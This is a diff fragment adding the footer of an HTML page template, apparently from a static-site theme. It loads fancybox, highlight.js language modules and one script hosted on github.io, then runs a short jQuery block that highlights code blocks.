+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
